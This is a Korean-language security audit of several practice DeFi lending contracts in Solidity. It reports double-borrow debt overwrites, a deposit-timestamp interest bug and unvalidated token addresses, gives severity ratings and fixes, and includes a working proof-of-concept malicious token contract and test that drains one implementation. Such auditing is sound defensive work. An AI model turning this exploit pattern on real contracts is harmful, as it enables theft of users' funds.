# 구현체 리스트
- https://github.com/Jp1n9/Practice-Lending
- https://github.com/procfs-web3/practice_lending
- https://github.com/Eunyeong2/Lending
- https://github.com/LTaeng/Lending
- https://github.com/dreamwooz3k/lending_protocol
- https://github.com/dh-yunjin/practice_DeFi/tree/main/Lending
- https://github.com/rkdnd/lending

## Eunyeong2 - Double Borrow
### 설명
한 사람이 두 번 대출을 받음으로써 생기는 취약점이다. 한 사람이 두 번 대출을 받는 것은 이론상 문제가 되지 않는다. 그러나 잘못된 구현으로 인해 대출을 두 번 받았을 때 상환을 하지 않아도 되거나, 상환해야 되는 금액이 줄어드는 버그가 있는 구현체들이 있었다.

```solidity
function borrow(address tokenAddress, uint256 amount) external payable { //대출. tokenAddress : 담보 토큰. amount : 담보의 양
    require(IERC20(tokenAddress).balanceOf(address(this)) >= amount, "Token is under borrow amount"); //pool에 남아 있는 돈 계산
    require(tokenAddress == USDC, "You can borrow only USDC");
    
    uint256 mortgage =  mortgages[msg.sender] * DreamOracle(oracle).getPrice(address(ETH));//담보 가격 가져오기
    uint256 limit = mortgage/2; //50% 비율로 빌려주기

    if (limit > amount){
        borrows[msg.sender][tokenAddress] = amount;
    } else{
        borrows[msg.sender][tokenAddress] = limit;
    }

    IERC20(USDC).transfer(msg.sender, borrows[msg.sender][tokenAddress]);

    total+=borrows[msg.sender][tokenAddress];
    times[msg.sender] = block.timestamp; // 빌린 시간 저장
}
```

연속된 borrow를 두 번 하면, 첫 번째 borrow에 대한 정보가 두 번째 borrow로 덮여씌워짐을 알 수 있다. 따라서, 첫 번째 borrow에 대한 상환의무가 사라진다.

### 파급력
큰 대출을 받은 이후 작은 대출을 받음으로써 큰 대출을 소거할 수 있다. 이는 lending service에 큰 금전적 손실을 입힐 수 있기 때문에 **High**로 평가했다.

### 해결 방안
- 근본적인 문제점은 borrow시 담보가 '묶이지' 않는다는 점이다. 즉 담보가 이동했다는 정보만 기록되고 borrower는 담보를 자유롭게 사용할 수 있다. borrow시 담보를 contract에게 귀속시켜야 한다. (이것 또한 취약점이지만, 코딩 실수인 것으로 판단하여 취약점 목록에서는 배제하였다.)
- double borrow를 require문으로 금지하거나, 기존 borrow에 새로운 borrow를 추가할 수 있는 로직을 추가한다.

## Eunyeong2 - Deposit이자 계산 오류
### 설명
`withdraw`함수에서는 원리합계를 계산하여 이자 및 원금을 돌려준다. 원리합계를 계산하는 함수 `calcualte`에는 deposit시점의 timestamp가 인자로 들어가는데, 이는 매핑인 `mapping(address => uint256) public times`에서 읽어온다. 문제점은, `deposit` 시 `times`를 설정해 주지 않아 저 시작 timestamp가 0이 된다는 점이다. 따라서 lending service는 실제로 흐른 시간보다 훨씬 많은 시간이 흐른 것으로 계산하여 이자를 과대평가할 것이다. 

`withdraw`코드에 은행의 잔고보다 많은 양을 인출하는 것을 방지하는 로직이 있기 때문에, 시작 timestamp를 0으로 하는 것은 withdraw amount를 과하게 키워 revert를 트리거할 가능성이 있다. 이 문제는 `borrow` 함수로 `times`를 적절한 값으로 설정하는 과정으로 극복할 수 있다.

### 파급력
은행에서 실제 이자보다 더 많은 이자를 인출해 갈 수 있다. 또한, `deposit`시점에 timestamp를 저장하지 않는 것은 단순 실수라고 취급해도 `borrow`와 `times`를 공유하는 구조는 취약하므로 보안 취약점으로 구분짓는 것이 타당하다. 따라서, 파급력은 **High**로 평가했다. 

### 해결 방안
- `deposit`시점에 `times`에 timestamp를 저장한다.
- `borrow`와 `deposit`이 쓰는 `times` 매핑을 분리한다.

## LTeang - Token Address 검증 미흡
### 설명
`repay`함수 구현이다.
```solidity
function repay(address tokenAddress, uint256 amount) external lock liquidated {
    DebtToken token = DebtToken(tokenAddress);
    IERC20 original = IERC20(token.original());

    require(original.balanceOf(msg.sender) >= amount, "Lending: Over than your balances");

    uint interest = token.getLastInterest(msg.sender);
    uint fee = (interest > amount) ? amount : interest;

    AToken(tokens[address(original)]).updateInterest(fee);
    token.burn(msg.sender, amount);

    if (token.balanceOf(msg.sender) == 0)
        AToken(tokens[address(0)]).setGuarantee(msg.sender, false);
}
```

tokenAddress에 악의적인 컨태그럭트의 주소를 넣으면, `usdcAToken.updateInterest()`를 원하는 인자로 계속 호출할 수 있다. 이렇게 되면 usdcAToken을 무수히 생성하여 은행에서 usdc를 전부 털어가는 것이 가능해진다.

### PoC
```solidity

contract MaliciousDToken {

    address _original;

    constructor(address original) {
        _original = original;
    }
    function original() public returns (address) {
        return _original;
    }

    function getLastInterest(address user) public returns (uint) {
        return 1000 ether;
    }

    function balanceOf(address user) public returns (uint) {
        return 0;
    }

    function burn(address user, uint amount) public {

    }
}

function testExploit() public {
    MaliciousDToken dt = new MaliciousDToken(address(usdc));

    vm.startPrank(carol);
    usdc.approve(address(lending), 1000 ether);
    lending.deposit(address(usdc), 1000 ether);
    vm.stopPrank();
    
    vm.startPrank(alice);
    vm.deal(alice, 1 ether);
    usdc.approve(address(lending), 1 ether);
    lending.deposit(address(usdc), 1 ether);
    lending.deposit{value: 1 ether}(address(0), 1 ether);
    lending.borrow(address(usdc), 1 ether);

    IERC20 aUSDCToken = IERC20(lending.getAToken(address(usdc)));
    uint aBalBefore = aUSDCToken.balanceOf(alice);
    for (uint i = 0; i < 1000; i++) {
        lending.repay(address(dt), 1000 ether);
    }
    uint aBalAfter = aUSDCToken.balanceOf(alice);
    console.log(aBalAfter - aBalBefore);
    lending.withdraw(address(aUSDCToken), 100 ether);
}
```

### 파급력
lending 서비스의 잔고를 비울 수 있기 때문에 **Critical**로 평가하였다. 

### 해결 방안
`tokenAddress`에 화이트리스트 기반 필터를 도입한다.

## rkdnd - Token Address 검증 미흡
### 설명
```solidity
function deposit(address tokenAddress, uint256 amount) override public{
    require(amount <= ERC20(tokenAddress).balanceOf(msg.sender), "InputToken overd own balance");
    ERC20(tokenAddress)._transfer(msg.sender, address(this), amount);

    _setBalance(tokenAddress, msg.sender, amount);
    _setTotalSupply();
}
```

tokenAddress를, `symbol`이 ETH또는 USDC이고 `_transfer` 함수에서 아무것도 하지 않도록 구성되어 있는 악의적인 컨트랙트 주소로 설정하면, 사용자가 아무런 가치를 지불하지 않았음에도 lending은 balance가 있는 것으로 취급할 것이다. 

### 파급력
lending 서비스의 돈을 일부(또는 전부) 훔칠 수 있기 때문에 **Critical**로 평가하였다.

### 해결 방안
앞에서 이야기했던 것과 마찬가지로, `tokenAddress`에 화이트리스트 기반 필터를 도입한다.

## wozz3k - Double Borrow
### 설명
`borrow`함수 구현이다.
```solidity
function borrow(address tokenAddress, uint256 amount) external
{
    require(tokenAddress==usdc_addr, "address value check");
    require(ERC20(tokenAddress).balanceOf(address(this))>=amount, "landing pool less");
    uint256 usdc_value = oracle.getPrice(usdc_addr);
    require(loan_list[msg.sender].bal_eth >= amount*usdc_value*2, "guarantee deposit");
    loan_list[msg.sender].guarantee = amount*usdc_value*2;
    loan_list[msg.sender].bal_eth -= amount*usdc_value*2;
    loan_list[msg.sender].loan_value+=amount;
    loan_list[msg.sender].time=block.timestamp;
    ERC20(tokenAddress).transfer(msg.sender, amount);
}
```

시간차이를 두고 두 번 대출을 받았을 때, 대출받은 시간 timestamp가 더 나중에 대출받은 것으로 덮여씌워진다. 따라서, 원리합계를 계산하는 곳에서 나중 timestamp만을 사용하여 lending 서비스가 마땅히 받아야 할 이자보다 더 적은 이자를 지불해도 담보를 상환받을 수 있는 취약점이 존재한다.

### 파급력
lending 서비스의 돈의 극히 일부를 훔칠 수 있기 때문에 **Low**로 평가하였다.

### 해결방안
double borrow를 원천적으로 금지하거나, loan_value에 amount를 단순히 더하는 것이 아니라 기존 loan_value에 원리합계 공식을 적용한 불어난 값을 넣고, 거기에 amount를 더하는 방식을 사용해야 한다.